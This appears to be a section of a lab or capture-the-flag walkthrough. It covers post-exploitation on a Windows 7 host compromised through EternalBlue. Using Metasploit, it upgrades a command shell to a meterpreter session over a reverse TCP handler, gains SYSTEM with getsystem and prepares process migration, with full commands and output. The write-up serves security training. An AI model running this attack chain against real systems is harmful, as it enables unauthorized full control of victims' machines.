# Escalating Privileges

Now we have a Windows CMD shell interface established in the connection, to escalate privileges we'll be needing to turn the interface to a meterpreter shell by using a metasploit module, so we'll have to find a way to do so after backgrounding the session.

```shell
C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i

Active sessions
===============

  Id  Name  Type               Information             Connection
  --  ----  ----               -----------             ----------
  1         shell x64/windows  Shell Banner: Microsof  10.10.40.118:4444 -> 10
                               t Windows [Version 6.1  .10.190.171:49244 (10.1
                               .7601] Copyright (c) 2  0.190.171)
                               009 Micros...

msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

&nbsp;

Now we can search for a module that changes the shell to a meterpreter shell and set the required options before running it

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to recei
                                       ve the connection
   LHOST                     no        IP of host that will receive the connec
                                       tion from the payload (Will try to auto
                                        detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.40.118:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
```

&nbsp;

Alternatively we can use metasploit built-in `sessions -u [SESSION]` command to escalate the session, which can open a new session as meterpreter.

As we get get a meterpreter shell, we can then run `getsystem` command to elevate our permissions from a local administrator to SYSTEM.

```shell
msf6 post(multi/manage/shell_to_meterpreter) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.40.118:4433  
[*] Sending stage (203846 bytes) to 10.10.190.171
[*] Meterpreter session 2 opened (10.10.40.118:4433 -> 10.10.190.171:49268) at 2025-02-07 19:12:32 +0000
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getsystem
meterpreter > shell
Process 2872 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

As we can see we have now escalate to NT AUTHOTIRY\\SYSTEM.

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\\SYSTEM and write down the process id

```shell
meterpreter > ps

Process List
============

 PID   PPID  Name         Arch  Session  User               Path
 ---   ----  ----         ----  -------  ----               ----
 0     0     [System Pro
             cess]
 4     0     System       x64   0
 416   4     smss.exe     x64   0        NT AUTHORITY\SYST  \SystemRoot\System
                                         EM                 32\smss.exe
 548   496   csrss.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\csrss.exe
 596   496   wininit.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\wininit.exe
 604   588   csrss.exe    x64   1        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\csrss.exe
 644   588   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\system3
             e                           EM                 2\winlogon.exe
 692   596   services.ex  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
             e                           EM                 2\services.exe
 700   596   lsass.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\lsass.exe
 708   596   lsm.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\lsm.exe
 724   692   svchost.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 816   692   svchost.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 884   692   svchost.exe  x64   0        NT AUTHORITY\NETW
                                         ORK SERVICE
 932   692   svchost.exe  x64   0        NT AUTHORITY\LOCA
                                         L SERVICE
 1000  644   LogonUI.exe  x64   1        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\LogonUI.exe
 1020  692   svchost.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 1060  692   svchost.exe  x64   0        NT AUTHORITY\LOCA
                                         L SERVICE
 1156  692   svchost.exe  x64   0        NT AUTHORITY\NETW
                                         ORK SERVICE
 1188  2164  powershell.  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             exe                         EM                 2\WindowsPowerShel
                                                            l\v1.0\powershell.
                                                            exe
 1320  692   svchost.exe  x64   0        NT AUTHORITY\LOCA
                                         L SERVICE
 1392  692   amazon-ssm-  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
             agent.exe                   EM                 mazon\SSM\amazon-s
                                                            sm-agent.exe
 1460  692   LiteAgent.e  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
             xe                          EM                 mazon\XenTools\Lit
                                                            eAgent.exe
 1600  692   Ec2Config.e  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
             xe                          EM                 mazon\Ec2ConfigSer
                                                            vice\Ec2Config.exe
 1908  692   svchost.exe  x64   0        NT AUTHORITY\NETW
                                         ORK SERVICE
 2012  548   conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\conhost.exe
 2060  692   svchost.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 2064  692   svchost.exe  x64   0        NT AUTHORITY\LOCA
                                         L SERVICE
 2076  816   WmiPrvSE.ex
             e
 2340  692   sppsvc.exe   x64   0        NT AUTHORITY\NETW
                                         ORK SERVICE
 2488  692   spoolsv.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 2556  692   vds.exe      x64   0        NT AUTHORITY\SYST
                                         EM
 2660  692   SearchIndex  x64   0        NT AUTHORITY\SYST
             er.exe                      EM
 3028  692   TrustedInst  x64   0        NT AUTHORITY\SYST
             aller.exe                   EM

meterpreter > 

```

&nbsp;

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

This is not necessary if the process we are running as is already SYSTEM.

&nbsp;